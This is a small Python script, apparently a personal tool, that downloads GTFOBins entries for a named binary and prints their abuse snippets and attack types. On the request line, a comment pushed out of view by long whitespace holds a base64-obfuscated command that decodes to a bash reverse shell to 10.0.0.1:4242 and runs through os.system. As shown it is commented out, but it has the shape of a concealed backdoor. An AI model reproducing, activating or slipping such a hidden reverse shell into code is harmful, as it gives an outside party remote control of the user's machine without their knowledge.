#!/bin/python3
import requests as req
import re
import yaml
import argparse
import pyfiglet
import requests_cache
import sys

requests_cache.install_cache(
    'cache', backend='sqlite', expire_after=180)

# response = req.get("https://gtfobins.github.io/")

#List of bins
# binaries = re.findall('<a href="\/\w+\/\w+\/" class="bin-name">(.*)<\/a>', response.text)


def getBins():
    for i in binaries:
        # Do nothing for now,Paxi garaula
        pass

#
def getDetails(bin):
    response = req.get(
        'https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/'+bin+'.md').text  # import os; shl="echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEK| base64 -d | bash -i"; os.system(shl)

    data = list(yaml.load_all(response, Loader=yaml.SafeLoader))
    data = data[0]['functions']
    return data


def parseData(data):
    data = dict(data)
    # Let's parse the dikt here.
    for d in data:
        innerData = data[d]
        for i in innerData:
            if 'description' in i:
                print('#'+'\033[33m'+i['description']+'\033[0m')
            print('Code: \t \033[92m' + i['code']+'\033[0m')
            print('\n')
            print('Attack Type: \33[31m' + d + '\033[0m')
            print('\n')
            print('-'*100)


def main():
    print('\033[92m' + pyfiglet.figlet_format("GTFOB")+'\033[0m')
    print("\033[92mcoded by\033[0m \33[31m @thecrysp\033[0m")
    print('-'*100)
    parser = argparse.ArgumentParser(description='GTFOBIN Command Line')
    parser.add_argument('--bin', help="binary name")
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    data = getDetails(args.bin)
    parseData(data)


if __name__ == "__main__":
    main()
